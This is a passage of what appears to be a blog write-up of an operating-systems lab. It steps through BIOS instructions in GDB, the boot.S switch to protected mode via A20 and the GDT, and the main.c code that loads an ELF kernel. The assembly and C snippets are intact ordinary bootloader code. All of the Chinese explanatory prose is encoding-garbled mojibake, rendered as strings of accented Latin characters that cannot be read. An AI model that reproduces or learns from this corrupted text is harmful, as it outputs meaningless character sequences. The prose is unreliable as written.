´äº†1MBå†…å­˜ç©ºé—´ï¼Œåœ¨80286å’Œ80386ä¸Šå·²ç»å®ç°äº†16MBï¼Œ4GBçš„åœ°å€ç©ºé—´ï¼Œä½†æ˜¯PCçš„æ¶æ„å¿…é¡»ä»æ—§æŠŠåŸæ¥çš„1MBçš„åœ°å€ç©ºé—´çš„ç»“æ„ä¿ç•™ä¸‹æ¥ï¼Œè¿™æ ·æ‰èƒ½å®ç°å‘åå…¼å®¹æ€§ã€‚æ‰€ä»¥ç°ä»£è®¡ç®—æœºçš„åœ°å€ 0x000A0000<del>0x00100000åŒºé—´æ˜¯ä¸€ä¸ªç©ºæ´ï¼Œä¸ä¼šè¢«ä½¿ç”¨ã€‚å› æ­¤è¿™ä¸ªç©ºæ´å°±æŠŠåœ°å€ç©ºé—´åˆ’åˆ†æˆäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†å°±æ˜¯ä»0x00000000</del>0x000A0000ï¼Œå«åšä¼ ç»Ÿå†…å­˜ã€‚å‰©ä¸‹çš„ä¸åŒ…æ‹¬ç©ºæ´çš„å…¶ä»–éƒ¨åˆ†å«åšæ‰©å±•å†…å­˜ã€‚è€Œå¯¹äºè¿™ç§32ä½å­—é•¿å¤„ç†å™¨é€šå¸¸æŠŠBIOSå­˜æ”¾åˆ°æ•´ä¸ªå­˜å‚¨ç©ºé—´çš„é¡¶ç«¯å¤„ã€‚</p><p><img src="/2023/11/29/OSlab1/image-20231130161251088.png" alt="image-20231130161251088"></p><h3 id="ç¬¬äºŒéƒ¨åˆ†ï¼šThe-Boot-Loader"><a href="#ç¬¬äºŒéƒ¨åˆ†ï¼šThe-Boot-Loader" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†ï¼šThe Boot Loader"></a>ç¬¬äºŒéƒ¨åˆ†ï¼šThe Boot Loader</h3><h4 id="ç»ƒä¹ 2"><a href="#ç»ƒä¹ 2" class="headerlink" title="ç»ƒä¹ 2:"></a>ç»ƒä¹ 2:</h4><p>ä½¿ç”¨gdbçš„<code>si</code>ï¼ˆå•æ­¥è°ƒè¯•ï¼‰å‘½ä»¤è¿›å…¥ROM BIOSå¹¶è¿½è¸ªå‡ æ¡æŒ‡ä»¤ï¼Œå¹¶çŒœæµ‹è¿™äº›æŒ‡ä»¤çš„ä½œç”¨ã€‚ä¸éœ€è¦æŒ‡å‡ºæŒ‡ä»¤å…·ä½“çš„ç»†èŠ‚ï¼Œåªè¦ç†è§£BIOSä¸€å¼€å§‹è¿è¡Œçš„æ ¸å¿ƒæ€æƒ³è€Œå·²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[f000:fff0]    0xffff0: ljmp   $0xf000,$0xe05b # è·³åˆ°ä¸€ä¸ªè¾ƒæ—©çš„ä½ç½®<br>[f000:e05b]    0xfe05b: cmpl   $0x0,%cs:0x6ac8<br>[f000:e062]    0xfe062: jne    0xfd2e1         # æµ‹è¯•csæ®µçš„0x6ac8å­—æ˜¯å¦ä¸º0        <br>[f000:e066]    0xfe066: xor    %dx,%dx         # æŠŠdxå¯„å­˜å™¨æ¸…é›¶<br>[f000:e068]    0xfe068: mov    %dx,%ss         <br>[f000:e06a]    0xfe06a: mov    $0x7000,%esp    <br>[f000:e070]    0xfe070: mov    $0xf34c2,%edx   <br>[f000:e076]    0xfe076: jmp    0xfd15c         <br>[f000:d15c]    0xfd15c: mov    %eax,%ecx       <br>[f000:d15f]    0xfd15f: cli                    # å…³é—­ç¡¬ä»¶ä¸­æ–­<br>[f000:d160]    0xfd160: cld                    # è®¾ç½®ä¸²ä¼ é€æŒ‡ä»¤æ–¹å‘<br>[f000:d161]    0xfd161: mov    $0x8f,%eax      <br>[f000:d167]    0xfd167: out    %al,$0x70       <br>[f000:d169]    0xfd169: in     $0x71,%al       # å…³é—­ä¸å¯å±è”½ä¸­æ–­ï¼Œ70ï¼Œ71ç«¯å£ç”¨äºæ§åˆ¶CMOSï¼Œæ“ä½œCMOSå­˜å‚¨å™¨ä¸­çš„å†…å®¹éœ€è¦ä¸¤ä¸ªç«¯å£ï¼Œä¸€ä¸ªæ˜¯0x70å¦ä¸€ä¸ªå°±æ˜¯0x71ã€‚å…¶ä¸­0x70å¯ä»¥å«åšç´¢å¼•å¯„å­˜å™¨ï¼Œè¿™ä¸ª8ä½å¯„å­˜å™¨çš„æœ€é«˜ä½æ˜¯ä¸å¯å±è”½ä¸­æ–­(NMI)ä½¿èƒ½ä½ã€‚å¦‚æœä½ æŠŠè¿™ä¸ªä½ç½®1ï¼Œåˆ™NMIä¸ä¼šè¢«å“åº”ã€‚ä½7ä½ç”¨äºæŒ‡å®šCMOSå­˜å‚¨å™¨ä¸­çš„å­˜å‚¨å•å…ƒåœ°å€<br>[f000:d16b]    0xfd16b: in     $0x92,%al       # è¯»å–ç³»ç»Ÿæ§åˆ¶ç«¯å£A<br>[f000:d16d]    0xfd16d: or     $0x2,%al        <br>[f000:d16f]    0xfd16f: out    %al,$0x92       # é€šè¿‡å¿«é€ŸA20ä»¥å¯åŠ¨A20<br>[f000:d171]    0xfd171: lidtw  %cs:0x6ab8      # å°†cs:0x6ab8åŠ è½½è¿›å…¥IDTè¡¨<br>[f000:d177]    0xfd177: lgdtw  %cs:0x6a74      # å°†cs:0x6a74åŠ è½½è¿›å…¥GDTè¡¨<br>[f000:d17d]    0xfd17d: mov    %cr0,%eax   <br>[f000:d180]    0xfd180: or     $0x1,%eax       <br>[f000:d184]    0xfd184: mov    %eax,%cr0       # å°†cr0å¯„å­˜å™¨çš„ä¿æŠ¤æ¨¡å¼ä½æ‰“å¼€<br>[f000:d187]    0xfd187: ljmpl  $0x8,$0xfd18f   # é€šè¿‡ljmpæŒ‡ä»¤è¿›å…¥ä¿æŠ¤æ¨¡å¼<br>=&gt; 0xfd18f:     mov    $0x10,%eax              # è®¾ç½®æ®µå¯„å­˜å™¨<br>=&gt; 0xfd194:     mov    %eax,%ds<br>=&gt; 0xfd196:     mov    %eax,%es  <br>=&gt; 0xfd198:     mov    %eax,%ss<br>=&gt; 0xfd19a:     mov    %eax,%fs<br>=&gt; 0xfd19c:     mov    %eax,%gs<br>=&gt; 0xfd19e:     mov    %ecx,%eax  <br>=&gt; 0xfd1a0:     jmp    *%edx                   # è·³è½¬<br></code></pre></td></tr></table></figure><p>æ€»çš„æ¥è¯´ï¼ŒBIOSçš„æ“ä½œå°±æ˜¯åœ¨æ§åˆ¶ï¼Œåˆå§‹åŒ–ï¼Œæ£€æµ‹å„ç§åº•å±‚çš„è®¾å¤‡ï¼Œæ¯”å¦‚æ—¶é’Ÿï¼ŒGDTRå¯„å­˜å™¨ã€‚ä»¥åŠè®¾ç½®ä¸­æ–­å‘é‡è¡¨ã€‚</p><h4 id="ç»ƒä¹ 3"><a href="#ç»ƒä¹ 3" class="headerlink" title="ç»ƒä¹ 3:"></a>ç»ƒä¹ 3:</h4><p>è®¾ç½®ä¸€ä¸ªæ–­ç‚¹åœ¨åœ°å€0x7c00å¤„ï¼Œè¿™æ˜¯boot sectorè¢«åŠ è½½çš„ä½ç½®ã€‚ç„¶åè®©ç¨‹åºç»§ç»­è¿è¡Œç›´åˆ°è¿™ä¸ªæ–­ç‚¹ã€‚è·Ÿè¸ª&#x2F;boot&#x2F;boot.Sæ–‡ä»¶çš„æ¯ä¸€æ¡æŒ‡ä»¤ï¼ŒåŒæ—¶ä½¿ç”¨boot.Sæ–‡ä»¶å’Œç³»ç»Ÿä¸ºä½ åæ±‡ç¼–å‡ºæ¥çš„æ–‡ä»¶obj&#x2F;boot&#x2F;boot.asmã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨GDBçš„x&#x2F;iæŒ‡ä»¤æ¥è·å–å»ä»»æ„ä¸€ä¸ªæœºå™¨æŒ‡ä»¤çš„åæ±‡ç¼–æŒ‡ä»¤ï¼ŒæŠŠæºæ–‡ä»¶boot.Sæ–‡ä»¶å’Œboot.asmæ–‡ä»¶ä»¥åŠåœ¨GDBåæ±‡ç¼–å‡ºæ¥çš„æŒ‡ä»¤è¿›è¡Œæ¯”è¾ƒã€‚</p><p>è¿½è¸ªåˆ°bootmainå‡½æ•°ä¸­ï¼Œè€Œä¸”è¿˜è¦å…·ä½“è¿½è¸ªåˆ°readsect()å­å‡½æ•°é‡Œé¢ã€‚æ‰¾å‡ºå’Œreadsect()cè¯­è¨€ç¨‹åºçš„æ¯ä¸€æ¡è¯­å¥æ‰€å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå›åˆ°bootmain()ï¼Œç„¶åæ‰¾å‡ºæŠŠå†…æ ¸æ–‡ä»¶ä»ç£ç›˜è¯»å–åˆ°å†…å­˜çš„é‚£ä¸ªforå¾ªç¯æ‰€å¯¹åº”çš„æ±‡ç¼–è¯­å¥ã€‚æ‰¾å‡ºå½“å¾ªç¯ç»“æŸåä¼šæ‰§è¡Œå“ªæ¡è¯­å¥ï¼Œåœ¨é‚£é‡Œè®¾ç½®æ–­ç‚¹ï¼Œç»§ç»­è¿è¡Œåˆ°æ–­ç‚¹ï¼Œç„¶åè¿è¡Œå®Œæ‰€æœ‰çš„å‰©ä¸‹çš„è¯­å¥ã€‚</p><p><img src="/2023/11/29/OSlab1/image-20231202231040821.png" alt="image-20231202231040821"></p><p><img src="/2023/11/29/OSlab1/image-20231203100345159.png" alt="image-20231203100345159"></p><p>å½“BIOSè¿è¡Œå®Œæ¯•ä¹‹åï¼Œcpuçš„æ§åˆ¶æƒå°±ä¼šè½¬ç§»åˆ°boot.Sä¸Šï¼Œæ‰€ä»¥åˆ†æboot.Sï¼Œé€šè¿‡ä»‹ç»å¯ä»¥çœ‹å‡ºï¼Œboot.Sçš„æ€»ä½“ä½œç”¨æ˜¯å°†å®æ¨¡å¼åˆ‡æ¢ä¸ºä¿æŠ¤æ¨¡å¼</p><h5 id="Boot-S"><a href="#Boot-S" class="headerlink" title="Boot.S"></a>Boot.S</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl start<br>start:<br>  .code16                     # Assemble for 16-bit mode<br>  cli                         # Disable interrupts<br>  cld                         # String operations increment<br><br>  # Set up the important data segment registers (DS, ES, SS).<br>  xorw    %ax,%ax             # Segment number zero<br>  movw    %ax,%ds             # -&gt; Data Segment<br>  movw    %ax,%es             # -&gt; Extra Segment<br>  movw    %ax,%ss             # -&gt; Stack Segment<br></code></pre></td></tr></table></figure><p>cliç”¨äºå…³é—­æ‰€æœ‰ä¸­æ–­ï¼Œcldç”¨äºæŒ‡å®šä¸²å¤„ç†æ“ä½œçš„æŒ‡é’ˆç§»åŠ¨æ–¹å‘ï¼Œæ¥ä¸‹æ¥æ˜¯å§dsï¼Œesï¼Œsså…¨éƒ¨æ¸…é›¶ï¼Œä¸ºåè¾¹è¿›å…¥ä¿æŠ¤æ¨¡å¼åšå‡†å¤‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  # Enable A20:<br>  #   For backwards compatibility with the earliest PCs, physical<br>  #   address line 20 is tied low, so that addresses higher than<br>  #   1MB wrap around to zero by default.  This code undoes this.<br>seta20.1:<br>  inb     $0x64,%al               # Wait for not busy<br>  testb   $0x2,%al<br>  jnz     seta20.1<br><br>  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64<br>  outb    %al,$0x64<br><br>seta20.2:<br>  inb     $0x64,%al               # Wait for not busy<br>  testb   $0x2,%al<br>  jnz     seta20.2<br><br>  movb    $0xdf,%al               # 0xdf -&gt; port 0x60<br>  outb    %al,$0x60<br><br></code></pre></td></tr></table></figure><p>å‰ä¸‰æ¡æŒ‡ä»¤è¯»å–äº†é”®ç›˜æ§åˆ¶å™¨çš„0x64ç«¯å£ï¼Œå¹¶é€šè¿‡ä¸2ç›¸ä¸ï¼Œæ¥æ£€æµ‹0x64çš„bit 1æ˜¯å¦ä¸º1ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶ï¼Œè¾“å…¥ç¼“å†²åŒºæ˜¯å¦æ»¡äº†ã€‚åªæœ‰å½“ç¼“å†²åŒºä¸æ»¡æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œåç»­ä»£ç </p><p><img src="/2023/11/29/OSlab1/image-20231203102700304.png" alt="image-20231203102700304"></p><p>åç»­å°†d1å†™å…¥åˆ°0x64ç«¯å£ï¼Œd1ä»£è¡¨ä¸‹ä¸€æ¬¡å†™å…¥0x60ç«¯å£çš„æ•°æ®å°†è¢«å†™å…¥ç»™804xæ§åˆ¶å™¨çš„è¾“å‡ºç«¯å£ã€‚</p><p><img src="/2023/11/29/OSlab1/image-20231203104130794.png" alt="image-20231203104130794"></p><p>Seta20.2åŒç†ï¼Œè¡¨ç¤ºå°†dfå†™è¿›0x60ç«¯å£ï¼Œdfç”¨äºå¼€å¯A20åœ°å€æ€»çº¿</p><p><img src="/2023/11/29/OSlab1/image-20231203104443964.png" alt="image-20231203104443964"></p><p><strong>ä»€ä¹ˆæ˜¯A20åœ°å€æ€»çº¿ï¼Ÿï¼š</strong></p><p>åœ¨æ—©æœŸçš„PCä¸Šå¤„ç†å™¨ä»…æ”¯æŒ20ä½çš„åœ°å€ç©ºé—´ï¼Œä»»ä½•è¶…è¿‡20ä½çš„åœ°å€éƒ½ä¼šè¢«å·å›ã€‚<br>ä¾‹å¦‚ï¼š0xFFFF+0xFFFF &#x3D; 0x1FFFE -&gt; 0xFFFE</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒA20æ˜¯ç½®0çš„ï¼Œè¿›å…¥ä¿æŠ¤æ¨¡å¼å‰éœ€è¦å…ˆæ‰“å¼€A20ä»¥è·å¾—å®Œå…¨çš„å¯»å€èƒ½åŠ›ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> # Switch from real to protected mode, using a bootstrap GDT<br> # and segment translation that makes virtual addresses <br> # identical to their physical addresses, so that the <br> # effective memory map does not change during the switch.<br> lgdt    gdtdesc<br> movl    %cr0, %eax<br> orl     $CR0_PE_ON, %eax<br> movl    %eax, %cr0<br> <br> ljmp    $PROT_MODE_CSEG, $protcseg<br> <br> <br> <br>.set PROT_MODE_CSEG, 0x8         # kernel code segment selectorï¼ˆè¿™å¥åœ¨ä»£ç æœ€å¼€å§‹ï¼‰<br><br>gdtdesc:<br>.word   0x17                           # sizeof(gdt) - 1<br>   .long   gdt                            # address gdt<br></code></pre></td></tr></table></figure><p> lgdt gdtdescï¼Œæ˜¯æŠŠgdtdescè¿™ä¸ªæ ‡è¯†ç¬¦ï¼ˆæ ‡è¯†ä¸€ä¸ªå†…å­˜åœ°å€ï¼Œå…±6ä¸ªå­—èŠ‚ï¼‰é€å…¥å…¨å±€æ˜ å°„æè¿°ç¬¦è¡¨å¯„å­˜å™¨GDTRä¸­ï¼Œåç»­å°†CR0çš„å€¼ç½®1ï¼Œä»£è¡¨ä¿æŠ¤æ¨¡å¼å¯åŠ¨ï¼Œæœ€åçš„è·³è½¬è¡¨ç¤ºå°†å½“å‰è¿è¡Œæ¨¡å¼åˆ‡æ¢æˆ32ä½åœ°å€æ¨¡å¼</p><p><strong>ä»€ä¹ˆæ˜¯å…¨å±€æè¿°ç¬¦è¡¨ï¼Ÿ</strong></p><p>è®°å½•çš„æ˜¯å†…å­˜å„ä¸ªæ®µçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬äº†æ®µåŸºå€ï¼Œæ®µç•Œé™ï¼Œæ®µå±æ€§ç­‰ä¿¡æ¯ã€‚ç¨‹åºé¦–å…ˆå°†å¯¹åº”çš„æ®µé€‰æ‹©å­ï¼ˆå¯ä»¥ç†è§£ä¸ºæ•°ç»„çš„ç´¢å¼•ï¼‰åŠ è½½è¿›å…¥æ®µå¯„å­˜å™¨ä¸­ã€‚ç„¶ååœ¨æ‰§è¡Œç¨‹åºæ—¶ï¼Œæ ¹æ®æŒ‡ä»¤çš„å†…å®¹ç¡®å®šåº”è¯¥ä½¿ç”¨çš„æ®µå¯„å­˜å™¨ï¼Œæ ¹æ®æ®µå¯„å­˜å™¨ä¸­çš„æ®µé€‰æ‹©å­ç¡®å®šåº”è¯¥ä½¿ç”¨çš„æ®µæè¿°ç¬¦ã€‚å†ç»“åˆæ®µæè¿°ç¬¦ä¸­åŒ…å«çš„ä¿¡æ¯åŠ ä¸ŠæŒ‡ä»¤è‡ªèº«çš„åœ°å€æ„é€ å‡ºå®é™…çš„ç‰©ç†åœ°å€ã€‚æœ€ç»ˆå°†è¯¥åœ°å€å‘é€åˆ°åœ°å€æ€»çº¿ä¸Šï¼Œåˆ°ç‰©ç†å†…å­˜ä¸­å¯»å€ï¼Œå¹¶å–å›ç›¸åº”çš„æ•°æ®ã€‚</p><p><img src="/2023/11/29/OSlab1/image-20231203110758011.png" alt="image-20231203110758011"></p><p>æ¥ä¸‹æ¥æ˜¯é‡æ–°åŠ è½½æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œè¿™æ˜¯æŒ‰ç…§è§„å®šæ¥çš„ï¼Œåªæœ‰è¿™æ ·æ‰èƒ½ä½¿åˆšåˆšåŠ è½½å®Œçš„GDTRå€¼ç”Ÿæ•ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  .code32                     # Assemble for 32-bit mode<br>protcseg:<br>  # Set up the protected-mode data segment registers<br>  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector<br>  movw    %ax, %ds                # -&gt; DS: Data Segment<br>  movw    %ax, %es                # -&gt; ES: Extra Segment<br>  movw    %ax, %fs                # -&gt; FS<br>  movw    %ax, %gs                # -&gt; GS<br>  movw    %ax, %ss                # -&gt; SS: Stack Segment<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çš„æŒ‡ä»¤å°±æ˜¯è®¾ç½®espå¯„å­˜å™¨çš„å€¼ï¼Œå¹¶æ­£å¼è·³è½¬åˆ°main.cæ–‡ä»¶çš„mainå‡½æ•°éƒ¨åˆ†æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Set up the stack pointer and call into C.<br>movl    $start, %esp<br>call bootmain<br></code></pre></td></tr></table></figure><h5 id="Main-c"><a href="#Main-c" class="headerlink" title="Main.c"></a>Main.c</h5><p>é¦–å…ˆç›´æ¥çœ‹Main.cçš„ä»‹ç»</p><p><img src="/2023/11/29/OSlab1/image-20231203134914979.png" alt="image-20231203134914979"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°main.cçš„ä»»åŠ¡æ˜¯ä»ç¡¬ç›˜å¼•å¯¼ä¸€ä¸ªELFæ ¼å¼çš„å†…æ ¸é•œåƒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// read 1st page off disk</span><br>readseg((<span class="hljs-type">uint32_t</span>) ELFHDR, SECTSIZE*<span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°readsegï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">readseg</span><span class="hljs-params">(uchar *pa, uint count, uint offset)</span>;<br></code></pre></td></tr></table></figure><p>æŠŠè·ç¦»å†…æ ¸èµ·å§‹åœ°å€offsetä¸ªåç§»é‡å­˜å‚¨å•å…ƒä½œä¸ºèµ·å§‹ï¼Œå°†å®ƒå’Œå®ƒä¹‹åçš„countå­—èŠ‚çš„æ•°æ®è¯»å‡ºé€å…¥ä»¥paä¸ºèµ·å§‹åœ°å€çš„å†…å­˜ç‰©ç†åœ°å€å¤„ã€‚</p><p>æ‰€ä»¥mainå‡½æ•°ä¸­ï¼Œè¿™æ¡æŒ‡ä»¤çš„æ„æ€å°±æ˜¯æŠŠå†…æ ¸çš„å‰4MBçš„å†…å®¹è¯»å–åˆ°ELFHDRä¸­</p><p>æ¥ä¸‹æ¥éªŒè¯å…¶æ˜¯å¦ä¸ºä¸€ä¸ªELFæ–‡ä»¶</p><p><strong>ä»€ä¹ˆæ˜¯ELFï¼Ÿ</strong></p><p>elfæ˜¯ä¸€ç§æ–‡ä»¶æ ¼å¼ï¼Œä¸»è¦è¢«ç”¨æ¥æŠŠç¨‹åºå­˜æ”¾åˆ°ç£ç›˜ä¸Šã€‚æ˜¯åœ¨ç¨‹åºè¢«ç¼–è¯‘å’Œé“¾æ¥åè¢«åˆ›å»ºå‡ºæ¥çš„ã€‚ä¸€ä¸ªelfæ–‡ä»¶åŒ…æ‹¬å¤šä¸ªæ®µã€‚å¯¹äºä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œé€šå¸¸åŒ…å«å­˜æ”¾ä»£ç çš„æ–‡æœ¬æ®µ(text section)ï¼Œå­˜æ”¾å…¨å±€å˜é‡çš„dataæ®µï¼Œå­˜æ”¾å­—ç¬¦ä¸²å¸¸é‡çš„rodataæ®µã€‚elfæ–‡ä»¶çš„å¤´éƒ¨å°±æ˜¯ç”¨æ¥æè¿°è¿™ä¸ªelfæ–‡ä»¶å¦‚ä½•åœ¨å­˜å‚¨å™¨ä¸­å­˜å‚¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// is this a valid ELF?</span><br><span class="hljs-keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)<br>   <span class="hljs-keyword">goto</span> bad;<br></code></pre></td></tr></table></figure><p>elfå¤´éƒ¨ä¿¡æ¯çš„magicå­—æ®µæ˜¯æ•´ä¸ªå¤´éƒ¨ä¿¡æ¯çš„å¼€ç«¯ã€‚å¹¶ä¸”å¦‚æœè¿™ä¸ªæ–‡ä»¶æ˜¯æ ¼å¼æ˜¯ELFæ ¼å¼çš„è¯ï¼Œæ–‡ä»¶çš„elf-&gt;magicåº”è¯¥æ˜¯&#x3D;ELF_MAGICçš„ï¼Œæ‰€ä»¥è¿™æ¡è¯­å¥å°±æ˜¯åˆ¤æ–­è¿™ä¸ªè¾“å…¥æ–‡ä»¶æ˜¯å¦æ˜¯åˆæ³•çš„elfå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ph = (<span class="hljs-keyword">struct</span> Proghdr *) ((<span class="hljs-type">uint8_t</span> *) ELFHDR + ELFHDR-&gt;e_phoff);<br></code></pre></td></tr></table></figure><p>å¤´éƒ¨ä¸­åŒ…å«Program Header Tableã€‚è¿™ä¸ªè¡¨æ ¼å­˜æ”¾ç€ç¨‹åºä¸­æ‰€æœ‰æ®µçš„ä¿¡æ¯ã€‚é€šè¿‡è¿™ä¸ªè¡¨æˆ‘ä»¬æ‰èƒ½æ‰¾åˆ°è¦æ‰§è¡Œçš„ä»£ç æ®µï¼Œæ•°æ®æ®µç­‰ç­‰ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å…ˆè·å¾—è¿™ä¸ªè¡¨ã€‚</p><p>è¿™æ¡æŒ‡ä»¤å°±å¯ä»¥å®Œæˆè¿™ä¸€ç‚¹ï¼Œé¦–å…ˆelfæ˜¯è¡¨å¤´èµ·å€ï¼Œè€Œphoffå­—æ®µä»£è¡¨Program Header Tableè·ç¦»è¡¨å¤´çš„åç§»é‡ã€‚æ‰€ä»¥phå¯ä»¥è¢«æŒ‡å®šä¸ºProgram Header Tableè¡¨å¤´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">eph = ph + ELFHDR-&gt;e_phnum;<br></code></pre></td></tr></table></figure><p>e_phnumå­˜æ”¾çš„æ—¶å€™Program Header Tableä¸­è¡¨é¡¹çš„ä¸ªæ•°ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯å°†ephæŒ‡å‘è¡¨çš„æœ«å°¾</p><p><img src="/2023/11/29/OSlab1/image-20231203142338121.png" alt="image-20231203142338121"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (; ph &lt; eph; ph++)<br>  <span class="hljs-comment">// p_pa is the load address of this segment (as well</span><br>    <span class="hljs-comment">// as the physical address)</span><br>readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);<br></code></pre></td></tr></table></figure><p>ph-&gt;paæŒ‡çš„æ˜¯è¿™ä¸ªæ®µåœ¨å†…å­˜ä¸­çš„ç‰©ç†åœ°å€ã€‚ph-&gt;offsetå­—æ®µæŒ‡çš„æ˜¯è¿™ä¸€æ®µçš„å¼€å¤´ç›¸å¯¹äºè¿™ä¸ªelfæ–‡ä»¶çš„å¼€å¤´çš„åç§»é‡ã€‚ph-&gt;fileszå­—æ®µæŒ‡çš„æ˜¯è¿™ä¸ªæ®µåœ¨elfæ–‡ä»¶ä¸­çš„å¤§å°ã€‚ph-&gt;memszåˆ™æŒ‡çš„æ˜¯è¿™ä¸ªæ®µè¢«å®é™…è£…å…¥å†…å­˜åçš„å¤§å°ã€‚è¿™ä¸ªforå¾ªç¯å°±æ˜¯åœ¨åŠ è½½æ‰€æœ‰çš„æ®µåˆ°å†…å­˜ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>)) (ELFHDR-&gt;e_entry))();<br></code></pre></td></tr></table></figure><p>e_entryå­—æ®µæŒ‡å‘çš„æ˜¯è¿™ä¸ªæ–‡ä»¶çš„æ‰§è¡Œå…¥å£åœ°å€ã€‚æ‰€ä»¥è¿™é‡Œç›¸å½“äºå¼€å§‹è¿è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯å†…æ ¸æ–‡ä»¶ã€‚ è‡ªæ­¤å°±æŠŠæ§åˆ¶æƒä»boot loaderè½¬äº¤ç»™äº†æ“ä½œç³»ç»Ÿçš„å†…æ ¸ã€‚</p><h4 id="ç»ƒä¹ 4"><a href="#ç»ƒä¹ 4" class="headerlink" title="ç»ƒä¹ 4"></a>ç»ƒä¹ 4</h4><p><strong>é˜…è¯»5.1åˆ°5.5èŠ‚ã€‚ç„¶åä¸‹è½½pointers.cçš„ä»£ç ï¼Œå¹¶ä¸”ç¼–è¯‘è¿è¡Œå®ƒï¼Œç¡®ä¿ä½ 